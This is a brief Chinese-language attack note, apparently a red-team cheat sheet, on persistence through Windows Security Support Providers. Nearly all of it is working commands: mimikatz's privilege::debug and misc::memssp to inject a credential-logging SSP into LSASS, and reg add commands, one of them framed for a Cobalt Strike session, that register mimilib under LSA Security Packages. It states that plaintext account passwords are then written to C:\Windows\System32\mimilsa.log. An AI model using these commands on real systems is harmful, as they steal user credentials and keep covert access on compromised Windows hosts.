基于验证DLL加载
SSP（Security Support Provider）：实现身份认证和权限维持。
## Method 1: mimikatz
```powershell
.\mimikatz.exe
privilege::debug
misc::memssp
```
然后`C:\Windows\System32\mimilsa.log`会记录登录的账号密码

## Regedit

```powershell
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
#CS中修改注册表中的值
shell echo yes | reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
```
然后`C:\Windows\System32\mimilsa.log`会记录登录的账号密码